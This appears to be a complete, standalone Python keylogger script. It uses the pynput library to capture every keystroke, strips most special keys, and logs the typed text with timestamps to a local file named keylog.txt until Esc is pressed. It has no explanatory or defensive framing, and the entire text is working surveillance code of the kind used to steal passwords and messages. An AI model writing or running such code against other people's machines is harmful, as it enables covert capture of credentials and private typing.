from pynput.keyboard import Key, Listener
import logging
import datetime
 
class Logger:
    def __init__(self):
        self.str_holder = ''
        self.timestamp = datetime.datetime.now()
 
    def on_press(self, key):
        key_char = str(key).strip("'")
        
        # Edit special inputs
        if key_char == 'Key.space':
            key_char = ' '
        elif len(key_char) > 1:
            key_char = ''
        
        self.str_holder += key_char
        

    def on_release(self, key):
        cur_time = datetime.datetime.now()
        # Log if a long enough time has elapsed
        if cur_time - self.timestamp > datetime.timedelta(seconds=5):
            logging.info(self.str_holder)
            self.str_holder = ''
            
        if key == Key.esc:
            return False
        
        self.timestamp = cur_time

    def run(self):
        logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener :
            listener.join()

logger = Logger()
logger.run()